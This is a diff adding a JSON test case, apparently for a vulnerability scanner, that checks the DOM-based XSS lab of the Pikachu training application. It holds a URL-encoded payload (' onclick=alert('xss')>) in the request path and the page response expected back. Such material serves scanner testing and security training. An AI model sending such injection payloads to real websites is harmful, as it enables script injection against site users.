@@ -1,0 +1,26 @@
+{
+    "name": "pikachu",
+    "vuln": "DOM型xss-x",
+    "version": "",
+    "comment": "仅需要多次发包验证的设置mainRequest字段2,否则都以1为准,多次发包依次延续",
+    "type": "1",
+    "mainRequest": {
+        "1": {
+            "request": {
+                "host": "",
+                "method": "GET",
+                "path": "/vul/xss/xss_dom_x.php?text=%27+onclick%3Dalert%28%27xss%27%29%3E",
+                "cookie": "",
+                "requestheader": "",
+                "requestbody": ""
+            },
+            "response": {
+                "statuscode": 200,
+                "statusmessage": "",
+                "responsetime": "",
+                "responseheader": "",
+                "responsebody": "<a href='#' onclick='domxss()'>有些费尽心机想要忘记的事情,后来真的就忘掉了</a>"
+            }
+        }
+    }
+}
